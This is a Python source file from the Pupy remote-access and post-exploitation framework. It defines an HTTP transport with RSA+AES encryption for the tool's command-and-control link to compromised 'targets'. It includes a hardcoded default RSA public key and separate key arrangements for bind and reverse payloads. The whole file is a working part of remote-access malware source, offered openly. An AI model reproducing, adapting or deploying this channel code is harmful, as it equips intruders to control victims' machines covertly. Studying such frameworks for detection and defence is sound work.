# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from network.transports import *
from network.lib import *

DEFAULT_RSA_PUB_KEY="""
-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAu1AvqNawlgXdpT3s0/YoOSj3bSsGOd2UXrDKmEt3VkGvDVyxllwm
9TctdCIS8X9ziOtpSH2yYcS1zwVD0qb/Dt6im6Z0jiaiizsZPqJL16SfmP7b41ub
iCcM4a3gI1wRxt3HtBDgqPVZTqsKPsC3m6fiWfOQCy9CmLSBlwwE+9+elnUG4pvA
XQn0KDdrnzo5qGLxFyj9/jLI4y+rhS9DlwgsmFd42MCaJ/CgceM7QChN0zjxxT23
Y/RSR6wnYKasDbz7KoCa/QkYpvN4XqmvUZVQDI2y8F87ta/Cqo3UMEz5hNYt96LU
KN2qXNVOeiCO57tFFriWnKk6cAFHgrGzwA23xKUYB9/YivaEMjrh7C3907B+I1bK
t/BXOxdRwbTHkWQWrpxfUGs+5LJzwwsixzNJOifqgFyZTef6EyNTwSyr0oRslNk7
JIrE1Lab5Ve26+M92pCrs/UOIxpSWSKRmJeWcyAiw3crYrzAxC9r654BnmCfeWtn
MRAWmUrljx6aJSojTAbeY9aDDrYQRuQ7VevO+SHxYwOG/1Jq+qgznTN3zroUI97w
5g1oVVJrthUrYQZYKboaiEZmQckxLU5ca9pAyXu/o4pa1ez4a14YbollG9bjSnbK
+qRicAn26w5undwWlPX52DnrOw0v9sAqazfzG5rMH7mKWnSDvHPWOAsCAwEAAQ==
-----END RSA PUBLIC KEY-----
"""

class TransportConf(Transport):
    info = "TCP transport using HTTP with RSA+AES"
    name = "http"
    server = PupyTCPServer
    client = PupyTCPClient
    stream = PupySocketStream
    def __init__(self, *args, **kwargs):
        Transport.__init__(self, *args, **kwargs)
        if self.launcher_type == LAUNCHER_TYPE_BIND: #reversing the RSA client/server for BIND payloads so the private key doesn't go on the target
            self.client_transport = chain_transports(
                    PupyHTTPClient.custom(keep_alive=True),
                    RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
                )
            self.server_transport = chain_transports(
                    PupyHTTPServer,
                    RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
                )

        else:
            self.client_transport = chain_transports(
                    PupyHTTPClient.custom(keep_alive=True),
                    RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
                )
            self.server_transport = chain_transports(
                    PupyHTTPServer,
                    RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
                )

